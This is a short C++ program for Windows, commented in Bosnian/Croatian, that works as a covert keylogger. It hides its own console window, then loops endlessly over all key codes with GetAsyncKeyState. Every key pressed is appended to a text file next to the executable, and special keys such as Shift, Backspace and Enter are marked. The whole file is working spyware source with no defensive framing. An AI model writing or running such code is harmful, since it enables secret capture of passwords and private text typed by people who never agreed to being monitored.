#include <iostream>
#include <Windows.h>
using namespace std;

//Disable warning-a
#pragma warning (disable : 4996)

//sprema karakter u file
int Save(int _key, char *file);

int main() {
	//sakrivanje konzole
	auto myConsole = GetConsoleWindow();
	ShowWindow(myConsole, 0);
	char i;
	while (true)
	{
		Sleep(10);//za smanjenu aktivnost cpu-a
		for (i = 8; i <= 255; i++)
		{
			//ako je button pritisnut
			if (GetAsyncKeyState(i) == -32767) {
				//fajl se sprema na istom mjestu gdje se nalazi .exe file
				//po potrebi promijeniti
				Save(i, "tekst.txt");
			}
		}
	}
	return 0;
}

int Save(int _key, char *file) {
	cout << _key << endl;
	Sleep(10);//smanjena vrijednost cpu-a
	FILE *OUTPUT_FILE;

	OUTPUT_FILE = fopen(file, "a+");
	//Dodavanje specijalnih karaktera
	//Po potrebi dodati nove if-ove
	if (_key == VK_SHIFT)
	{
		fprintf(OUTPUT_FILE, "%s", "[SHIFT]");
	}
	else if (_key == VK_BACK)
	{
		fprintf(OUTPUT_FILE, "%s", "[BACK]");
	}
	else if (_key == VK_LBUTTON)
	{
		fprintf(OUTPUT_FILE, "%s", "[LBUTTON]");
	}
	else if (_key == VK_RBUTTON)
	{
		fprintf(OUTPUT_FILE, "%s", "[RBUTTON]");
	}
	else if (_key == VK_RETURN)
	{
		fprintf(OUTPUT_FILE, "%s", "[RETURN]");
	}
	else if (_key == VK_ESCAPE)
	{
		fprintf(OUTPUT_FILE, "%s", "[ESCAPE]");
	}
	else
		fprintf(OUTPUT_FILE, "%s", &_key);
	fprintf(OUTPUT_FILE, "%s", "\n");//dodavanje novog reda nakon svakog karaktera
	fclose(OUTPUT_FILE);
	return 0;
}